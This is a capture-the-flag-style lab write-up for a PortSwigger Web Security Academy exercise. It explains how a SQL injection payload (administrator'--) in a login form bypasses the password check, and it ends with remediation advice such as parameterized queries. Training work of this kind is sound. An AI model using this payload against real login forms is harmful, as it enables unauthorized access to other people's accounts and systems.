# Lab 02 — SQL Injection Vulnerability Allowing Login Bypass

**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Apprentice  
**Vulnerability Class:** SQL Injection  
**Date Solved:** May 2026  
**Author:** XypherSec  

---

## Objective

Exploit a SQL injection vulnerability in the login form 
to bypass authentication and log in as the administrator 
user without knowing the password.

---

## Reconnaissance

Navigating to the login page revealed a standard username 
and password form. The login functionality appeared to 
query a backend database using user-supplied input with 
no visible input sanitization — a potential injection point.

---

## Exploitation

**Payload used:**
administrator'--

**Steps taken:**
1. Navigated to the login page in the browser
2. Entered `administrator'--` in the username field
3. Entered any value in the password field
4. Submitted the form

**Backend query before injection:**
```sql
SELECT * FROM users WHERE username = 'administrator' 
AND password = 'anything'
```

**Backend query after injection:**
```sql
SELECT * FROM users WHERE username = 'administrator'
--' AND password = 'anything'
```

The single quote `'` closed the username string prematurely. 
The double dash `--` commented out the remainder of the 
query, removing the password check entirely.

**Result:** Successfully logged in as administrator without 
a valid password. Lab solved.

---

## Remediation

- Use **parameterized queries** (prepared statements) for 
  all login queries
- Never construct SQL queries using string concatenation 
  with user input
- Implement **account lockout** after repeated failed 
  login attempts
- Use **multi-factor authentication** on privileged accounts

**Secure code example (Python):**
```python
cursor.execute(
    "SELECT * FROM users WHERE username = ? AND password = ?",
    (username, password)
)
```

---

## References

- [PortSwigger SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
